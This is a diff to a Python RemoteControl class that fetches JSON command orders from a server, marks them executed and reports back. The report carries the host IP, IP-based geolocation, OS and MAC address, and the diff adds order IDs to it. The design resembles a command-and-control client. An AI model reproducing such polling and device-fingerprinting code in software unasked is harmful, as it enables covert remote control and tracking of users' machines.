@@ -24,6 +24,10 @@ class RemoteControl:
     orderJson = json.loads(self.order)
     return orderJson['command'].lower()
 
+  def getOrderId(self):
+    orderJson = json.loads(self.order)
+    return orderJson['orderId']
+
   def checkExecuted(self):
     orderJson = json.loads(self.order)
     return orderJson['executed']
@@ -33,9 +37,11 @@ class RemoteControl:
     time.sleep(1)
     response = requests.get(responseUrl)
     csrftoken = response.cookies['csrftoken']
-    # payload = {
-    #           'executed':'True',
-    #           }
+    if(payload == None):
+      payload = {
+        'orderId':self.getOrderId(),
+        'executed':'True',
+      }
     headers = {
               'Referer': responseUrl,
               'X-CSRFToken': csrftoken
@@ -50,6 +56,8 @@ class RemoteControl:
     ip = socket.gethostbyname(socket.gethostname())
     location = geocoder.ip('me').address
     payload = {
+      'orderId':self.getOrderId(),
+      'order':self.getCleanOrder(),
       'executed':'True',
       'os':self.os,
       'mac':mac,
